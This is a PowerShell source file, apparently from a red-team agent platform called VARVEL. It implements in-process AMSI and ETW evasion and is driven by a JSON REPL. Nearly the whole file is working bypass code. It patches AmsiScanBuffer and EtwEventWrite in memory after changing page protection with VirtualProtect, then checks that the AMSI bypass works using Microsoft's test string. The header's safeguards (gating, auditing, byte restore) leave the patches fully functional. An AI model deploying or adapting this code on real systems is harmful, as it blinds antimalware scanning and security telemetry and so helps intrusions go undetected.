# VARVEL - EVASION INTERNALS TIER (stage 1), persistent PowerShell host.
#
# DOCTRINE (2026-08-12, operator directive): the platform's old absolute no-evasion rule
# is LIFTED. Evasion is now a capability - shipped the VARVEL way: default-OFF,
# double-gated (engagement exec.evasion AND the agent's own launch flag - the caller
# enforces both BEFORE a job ever reaches this host), fully audited, REVERSIBLE (every
# patch restorable - cleanup doctrine), and MEASURED by the detection oracle, never
# claimed.
#
# What this host does (stage 1 scope - PowerShell-agent level, NO native code):
#   IN-MEMORY, OWN-PROCESS-ONLY patches, applied to THIS process and nowhere else:
#     amsi - the well-published in-memory AmsiScanBuffer patch (amsi.dll):
#            mov eax, 0x80070057 ; ret   (E_INVALIDARG - the scan call fails before
#            content is ever evaluated; script/content scans THIS process submits are
#            neutralized in-process)
#     etw  - the well-published in-memory EtwEventWrite noop (ntdll.dll):
#            mov eax, 0 ; ret            (ERROR_SUCCESS - this process's own ETW event
#            writes succeed-and-do-nothing)
#   VERIFY + RESTORE machinery (mandatory, the honesty core):
#     - BEFORE any write: snapshot the original bytes (their sha256 is the evidence).
#     - AFTER the write: re-read and byte-compare (the patch is PROVEN, not assumed) -
#       and for AMSI the OFFICIAL Microsoft test string is scanned before AND after
#       (blocked -> clear is a MEASURED flip, in this process, through the real AMSI
#       provider chain). ETW is byte-verified only in stage 1 (documented in the
#       evidence); its end-to-end effect is the detoracle's measurement on the next
#       probe, not a claim made here.
#     - restore writes the ORIGINAL bytes back and re-verifies (restore-verified);
#       AMSI is scanned once more - the flip-BACK (clear -> blocked) is measured too.
#     - status reports patched / restored / failed / not-applied honestly, with the
#       evidence attached. A failure is a loud 'failed', never a quiet lie.
#
# HARD BOUNDARY (permanent): own process only. Nothing here touches another process,
# the kernel, or on-disk bytes. Sleepmask-class memory encryption and UDRL need a
# NATIVE compiled loader - PS/Node agents cannot do them (the pending native-agent
# decision, stated plainly in docs/AGENT-GUIDE.md). Process exit is the ultimate
# restore: every patch this host holds vanishes with the process, by construction.
#
# Wire protocol (the REPL the Node side drives - agents/evasion.mjs):
#   stdin:  ONE JSON job per line  {"op":"enable"|"restore"|"status","techniques":["amsi","etw"]|null}
#   stdout: ONE JSON result per job
#     {"op","pid","state","techniques":{"amsi":{"state","originalSha256",
#     "patchedSha256","restoredSha256","byteVerified","restoreVerified","verify":{...}}},
#     "at"}   - op leads so the channel's 120-char ledger preview always carries it.
#   NOTE: Add-Type JIT-compiles the P/Invoke shim once per host (PS 5.1: transient csc
#   temp files under %TEMP% - .NET framework noise, never payload bytes; PS 7+: fully
#   in-memory). Stated honestly, not hidden.
#
# This file is MIRROR-INLINED into agents/varvel-agent.ps1 (the real range agent is
# staged as a single self-contained file - va-boot.ps1 drops it alone). The library
# block between the ==EVASION-LIB== markers is byte-identical in both files by
# convention; change one, change the other.

$ErrorActionPreference = 'Stop'

# ==EVASION-LIB== begin (mirror: agents/varvel-agent.ps1) -----------------------------

function Get-VvSha256Hex([byte[]]$Bytes) {
  $s = [System.Security.Cryptography.SHA256]::Create()
  try { return ([BitConverter]::ToString($s.ComputeHash($Bytes))).Replace('-','').ToLower() }
  finally { $s.Dispose() }
}

# The patch recipes - the well-published, public in-memory neutralizations. The channel
# never ships these bytes: the recipe lives agent-side only; the channel audits its
# sha256 (engine/evasion.mjs EVASION_RECIPES - keep the two copies in lockstep).
function Get-VvEvasionRecipe([string]$Tech) {
  switch ($Tech) {
    'amsi' { return @{ Dll = 'amsi.dll'; Export = 'AmsiScanBuffer'; Patch = [byte[]](0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3); Note = 'mov eax,0x80070057; ret - in-memory AmsiScanBuffer neutralization (well-published public tradecraft)' } }
    'etw'  { return @{ Dll = 'ntdll.dll'; Export = 'EtwEventWrite'; Patch = [byte[]](0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3); Note = 'mov eax,0; ret - in-memory EtwEventWrite success-noop (well-published public tradecraft)' } }
    default { throw "unknown evasion technique: $Tech (stage 1 ships amsi, etw only - own-process, in-memory, nothing else)" }
  }
}

$script:VvEvasionState = @{}   # technique -> @{ Address; Original; Patch; State }

function Initialize-VvEvasion {
  if ('VvEvasionNative' -as [type]) { return }
  # Add-Type JIT-compiles the P/Invoke shim once per process (PS 5.1: transient csc temp
  # files under %TEMP% - .NET framework noise, never payload bytes; PS 7+: in-memory).
  Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
public static class VvEvasionNative {
  [DllImport("kernel32.dll", CharSet=CharSet.Unicode)] public static extern IntPtr GetModuleHandle(string lpModuleName);
  [DllImport("kernel32.dll", CharSet=CharSet.Unicode)] public static extern IntPtr LoadLibrary(string lpFileName);
  [DllImport("kernel32.dll", CharSet=CharSet.Ansi)]   public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
  [DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
  [DllImport("amsi.dll", CharSet=CharSet.Unicode)] public static extern int AmsiInitialize(string appName, out IntPtr amsiContext);
  [DllImport("amsi.dll")] public static extern int AmsiOpenSession(IntPtr amsiContext, out IntPtr amsiSession);
  [DllImport("amsi.dll", CharSet=CharSet.Unicode)] public static extern int AmsiScanString(IntPtr amsiContext, string content, string contentName, IntPtr amsiSession, out int result);
  [DllImport("amsi.dll")] public static extern void AmsiCloseSession(IntPtr amsiContext, IntPtr amsiSession);
  [DllImport("amsi.dll")] public static extern void AmsiUninitialize(IntPtr amsiContext);
}
'@
}

function Read-VvBytes([IntPtr]$Addr, [int]$Len) {
  $b = New-Object byte[] $Len
  [System.Runtime.InteropServices.Marshal]::Copy($Addr, $b, 0, $Len)
  return $b
}
function Write-VvBytes([IntPtr]$Addr, [byte[]]$Bytes) {
  [System.Runtime.InteropServices.Marshal]::Copy($Bytes, 0, $Addr, $Bytes.Length)
}
function Test-VvBytesEqual([byte[]]$A, [byte[]]$B) {
  if ($null -eq $A -or $null -eq $B -or $A.Length -ne $B.Length) { return $false }
  for ($i = 0; $i -lt $A.Length; $i++) { if ($A[$i] -ne $B[$i]) { return $false } }
  return $true
}

function Get-VvEvasionTarget([string]$Tech) {
  $recipe = Get-VvEvasionRecipe $Tech
  $mod = [VvEvasionNative]::GetModuleHandle($recipe.Dll)
  if ($mod -eq [IntPtr]::Zero) { $mod = [VvEvasionNative]::LoadLibrary($recipe.Dll) }
  if ($mod -eq [IntPtr]::Zero) { throw "cannot load $($recipe.Dll) into this process" }
  $addr = [VvEvasionNative]::GetProcAddress($mod, $recipe.Export)
  if ($addr -eq [IntPtr]::Zero) { throw "cannot resolve $($recipe.Dll)!$($recipe.Export) in this process" }
  return $addr
}

# The OFFICIAL Microsoft AMSI test string (AMSI Test Sample: 7e72c3ce-861b-4339-8740-
# 0ac1484c1386), scanned IN THIS PROCESS through the real provider chain. Returns
# 'blocked' (the provider flagged it: result >= 0x4001 - DETECTED or BLOCKED-BY-ADMIN),
# 'clear' (clean, not-detected, OR the scan call itself failed - post-patch the patched
# AmsiScanBuffer returns E_INVALIDARG and the content is never evaluated), or
# 'unavailable:<hr>' when AMSI cannot even initialize in this process (honest third
# state - a flip cannot be proven against an unavailable scanner).
function Invoke-VvAmsiTestScan {
  $ctx = [IntPtr]::Zero; $sess = [IntPtr]::Zero
  try {
    $hr = [VvEvasionNative]::AmsiInitialize('VARVEL-evasion-verify', [ref]$ctx)
    if ($hr -ne 0 -or $ctx -eq [IntPtr]::Zero) { return ('unavailable:0x{0:x8}' -f $hr) }
    $hr = [VvEvasionNative]::AmsiOpenSession($ctx, [ref]$sess)
    if ($hr -ne 0) { return ('unavailable:0x{0:x8}' -f $hr) }
    $res = 0
    $hr = [VvEvasionNative]::AmsiScanString($ctx, 'AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386', 'varvel-evasion-verify', $sess, [ref]$res)
    if ($hr -ne 0) { return 'clear' } # the scan itself failed - content never evaluated (the patched state)
    return $(if ($res -ge 0x4001) { 'blocked' } else { 'clear' })
  } catch {
    return ('unavailable:' + $_.Exception.Message)
  } finally {
    if ($sess -ne [IntPtr]::Zero) { try { [VvEvasionNative]::AmsiCloseSession($ctx, $sess) } catch {} }
    if ($ctx -ne [IntPtr]::Zero) { try { [VvEvasionNative]::AmsiUninitialize($ctx) } catch {} }
  }
}

function Enable-VvEvasionTech([string]$Tech) {
  $recipe = Get-VvEvasionRecipe $Tech
  $ev = [ordered]@{
    state = 'failed'; recipe = ($recipe.Dll + '!' + $recipe.Export); recipeNote = $recipe.Note
    recipeSha256 = (Get-VvSha256Hex $recipe.Patch)
    originalSha256 = $null; patchedSha256 = $null; restoredSha256 = $null
    byteVerified = $false; restoreVerified = $false; verify = $null; note = $null; error = $null
  }
  try {
    Initialize-VvEvasion
    $addr = Get-VvEvasionTarget $Tech
    $patch = [byte[]]$recipe.Patch
    # MEASURED BEFORE-STATE (amsi): scan the official test string pre-patch.
    $scanBefore = $null
    if ($Tech -eq 'amsi') { $scanBefore = Invoke-VvAmsiTestScan }
    # SNAPSHOT FIRST - the cleanup doctrine: never write bytes you cannot put back.
    $orig = Read-VvBytes $addr $patch.Length
    $ev.originalSha256 = Get-VvSha256Hex $orig
    $oldProtect = [uint32]0
    if (-not [VvEvasionNative]::VirtualProtect($addr, [UIntPtr][uint32]$patch.Length, 0x40, [ref]$oldProtect)) { throw 'VirtualProtect(PAGE_EXECUTE_READWRITE) refused' }
    Write-VvBytes $addr $patch
    $tmp = [uint32]0
    [void][VvEvasionNative]::VirtualProtect($addr, [UIntPtr][uint32]$patch.Length, $oldProtect, [ref]$tmp)
    # PROVE the write: re-read and byte-compare. No compare, no claim.
    $readback = Read-VvBytes $addr $patch.Length
    $ev.byteVerified = Test-VvBytesEqual $readback $patch
    if (-not $ev.byteVerified) { throw 'patch write did NOT verify (re-read mismatch) - the write did not take; nothing claimed' }
    $ev.patchedSha256 = Get-VvSha256Hex $patch
    if ($Tech -eq 'amsi') {
      $scanAfter = Invoke-VvAmsiTestScan
      $ev.verify = [ordered]@{
        probe = 'official-amsi-test-string (in-process AmsiScanString)'
        before = $scanBefore; after = $scanAfter
        flipProven = ($scanBefore -eq 'blocked' -and $scanAfter -eq 'clear')
      }
      if (-not $ev.verify.flipProven) { $ev.note = 'bytes patched + verified, but the blocked->clear flip was NOT measured (before=' + $scanBefore + ', after=' + $scanAfter + ') - patch state is byte-proven only; the scanner may be off/absent on this host' }
    } else {
      $ev.verify = [ordered]@{
        probe = 'byte-reverify only'
        before = $null; after = $null; flipProven = $false
        functional = 'not-probed (stage 1: ETW neutralization is byte-verified; its end-to-end effect is the detoracle measurement on the next probe, not a claim made here)'
      }
    }
    $script:VvEvasionState[$Tech] = @{ Address = $addr; Original = $orig; Patch = $patch; State = 'patched' }
    $ev.state = 'patched'
  } catch { $ev.state = 'failed'; $ev.error = [string]$_.Exception.Message }
  return $ev
}

function Restore-VvEvasionTech([string]$Tech) {
  $recipe = Get-VvEvasionRecipe $Tech
  $ev = [ordered]@{
    state = 'restored'; recipe = ($recipe.Dll + '!' + $recipe.Export); recipeNote = $recipe.Note
    recipeSha256 = (Get-VvSha256Hex $recipe.Patch)
    originalSha256 = $null; patchedSha256 = $null; restoredSha256 = $null
    byteVerified = $false; restoreVerified = $false; verify = $null; note = $null; error = $null
  }
  $st = $script:VvEvasionState[$Tech]
  if ($null -eq $st -or $st.State -ne 'patched') {
    $ev.note = 'no live patch in THIS process - nothing to restore (in-memory patches never survive process exit; this process was already clean)'
    return $ev
  }
  try {
    Initialize-VvEvasion
    $orig = [byte[]]$st.Original
    $ev.originalSha256 = Get-VvSha256Hex $orig
    $ev.patchedSha256 = Get-VvSha256Hex ([byte[]]$st.Patch)
    $oldProtect = [uint32]0
    if (-not [VvEvasionNative]::VirtualProtect($st.Address, [UIntPtr][uint32]$orig.Length, 0x40, [ref]$oldProtect)) { throw 'VirtualProtect(PAGE_EXECUTE_READWRITE) refused on restore' }
    Write-VvBytes $st.Address $orig
    $tmp = [uint32]0
    [void][VvEvasionNative]::VirtualProtect($st.Address, [UIntPtr][uint32]$orig.Length, $oldProtect, [ref]$tmp)
    # PROVE the restore: re-read must equal the SNAPSHOT bytes, exactly.
    $readback = Read-VvBytes $st.Address $orig.Length
    $ev.restoreVerified = Test-VvBytesEqual $readback $orig
    if (-not $ev.restoreVerified) { throw 'restore write did NOT verify (re-read != snapshot) - the region is NOT restored; this is a loud failure, not a quiet lie' }
    $ev.restoredSha256 = $ev.originalSha256
    if ($Tech -eq 'amsi') {
      # MEASURED flip-BACK: the official test string must be blocked again.
      $scanAfter = Invoke-VvAmsiTestScan
      $ev.verify = [ordered]@{
        probe = 'official-amsi-test-string (in-process AmsiScanString)'
        before = 'clear'; after = $scanAfter
        flipBackProven = ($scanAfter -eq 'blocked')
      }
      if (-not $ev.verify.flipBackProven) { $ev.note = 'original bytes restored + verified, but the clear->blocked flip-back was NOT measured (after=' + $scanAfter + ') - the scanner may be off/absent on this host' }
    } else {
      $ev.verify = [ordered]@{ probe = 'byte-reverify only'; before = $null; after = $null; flipBackProven = $false; functional = 'not-probed (stage 1: byte-verified restore)' }
    }
    $st.State = 'restored'
    $ev.state = 'restored'
  } catch { $ev.state = 'failed'; $ev.error = [string]$_.Exception.Message }
  return $ev
}

function Get-VvEvasionStatusTech([string]$Tech) {
  $recipe = Get-VvEvasionRecipe $Tech
  $st = $script:VvEvasionState[$Tech]
  $ev = [ordered]@{
    state = $(if ($null -eq $st) { 'not-applied' } else { [string]$st.State })
    recipe = ($recipe.Dll + '!' + $recipe.Export); recipeNote = $recipe.Note
    recipeSha256 = (Get-VvSha256Hex $recipe.Patch)
    originalSha256 = $null; patchedSha256 = $null; restoredSha256 = $null
    byteVerified = $false; restoreVerified = $false; verify = $null; note = $null; error = $null
  }
  if ($null -ne $st) {
    $ev.originalSha256 = Get-VvSha256Hex ([byte[]]$st.Original)
    $ev.patchedSha256 = Get-VvSha256Hex ([byte[]]$st.Patch)
    if ($st.State -eq 'restored') { $ev.restoredSha256 = $ev.originalSha256; $ev.restoreVerified = $true }
    if ($st.State -eq 'patched') {
      # Live re-read: status RE-PROVES the patch is still in place right now (measured,
      # not remembered). A mismatch flips the honest state to 'tampered'.
      try {
        Initialize-VvEvasion
        $cur = Read-VvBytes $st.Address ([byte[]]$st.Patch).Length
        $ev.byteVerified = Test-VvBytesEqual $cur ([byte[]]$st.Patch)
        if (-not $ev.byteVerified) { $ev.state = 'tampered'; $ev.note = 'live re-read != patch bytes - the region changed since the write (someone restored or re-patched it); reporting honestly' }
      } catch { $ev.note = 'live re-verify failed: ' + $_.Exception.Message }
    }
  } else {
    $ev.note = 'never patched in this process'
  }
  return $ev
}

# Dispatch one op into a result JSON string. $Op: enable | restore | status.
# $Techniques: string[] or empty (restore/status with none = all known / all patched).
function Invoke-VvEvasionOp([string]$Op, [string[]]$Techniques) {
  $known = @('amsi', 'etw')
  $techMap = [ordered]@{}
  if ($Op -eq 'enable') {
    if ($null -eq $Techniques -or $Techniques.Count -eq 0) { throw 'evasion-enable: techniques is empty - nothing to do' }
    foreach ($t in $Techniques) {
      if ($known -notcontains $t) { throw "unknown evasion technique: $t (stage 1 ships amsi, etw only - own-process, in-memory, nothing else)" }
      $techMap[$t] = Enable-VvEvasionTech $t
    }
  } elseif ($Op -eq 'restore') {
    $targets = @()
    if ($null -eq $Techniques -or $Techniques.Count -eq 0) {
      foreach ($t in $known) { $st = $script:VvEvasionState[$t]; if ($null -ne $st -and $st.State -eq 'patched') { $targets += $t } }
      if ($targets.Count -eq 0) { $targets = $known } # nothing live: report the honest no-op per technique
    } else {
      foreach ($t in $Techniques) { if ($known -notcontains $t) { throw "unknown evasion technique: $t" } }
      $targets = $Techniques
    }
    foreach ($t in $targets) { $techMap[$t] = Restore-VvEvasionTech $t }
  } elseif ($Op -eq 'status') {
    foreach ($t in $known) { $techMap[$t] = Get-VvEvasionStatusTech $t }
  } else {
    throw "unknown evasion op: $Op (want enable | restore | status)"
  }
  # Aggregate state: 'failed' if ANY failed (a partial patch is never dressed up as a
  # win); else the op's success state; status aggregates 'untouched' / 'patched' /
  # 'restored' / 'mixed' from the per-technique truth.
  $states = @($techMap.Values | ForEach-Object { [string]$_.state })
  if ($states -contains 'failed') { $agg = 'failed' }
  elseif ($Op -eq 'enable') { $agg = 'patched' }
  elseif ($Op -eq 'restore') { $agg = 'restored' }
  else {
    if (($states | Where-Object { $_ -ne 'not-applied' }).Count -eq 0) { $agg = 'untouched' }
    elseif ($states -contains 'patched') { $agg = 'patched' }
    elseif (($states | Where-Object { $_ -eq 'restored' }).Count -eq $states.Count) { $agg = 'restored' }
    else { $agg = 'mixed' }
  }
  $result = [ordered]@{ op = $Op; pid = $PID; state = $agg; techniques = $techMap; at = [DateTime]::UtcNow.ToString('o') }
  return ($result | ConvertTo-Json -Compress -Depth 6)
}

# ==EVASION-LIB== end -----------------------------------------------------------------

# The REPL: one JSON job line in, one JSON result line out, until stdin closes (the
# Node runner owns this process's lifetime; when it dies, every patch dies with it).
while ($true) {
  $line = [Console]::In.ReadLine()
  if ($null -eq $line) { break }
  $line = $line.Trim()
  if ($line.Length -eq 0) { continue }
  $out = ''
  try {
    $job = $line | ConvertFrom-Json
    $techs = @()
    if ($job.techniques) { $techs = @($job.techniques | ForEach-Object { ([string]$_).ToLower().Trim() } | Where-Object { $_.Length -gt 0 }) }
    $out = Invoke-VvEvasionOp ([string]$job.op).ToLower() ([string[]]$techs)
  } catch {
    $out = ([ordered]@{ op = 'error'; pid = $PID; state = 'failed'; techniques = @{}; error = [string]$_.Exception.Message; at = [DateTime]::UtcNow.ToString('o') } | ConvertTo-Json -Compress)
  }
  [Console]::Out.WriteLine($out)
  [Console]::Out.Flush()
}
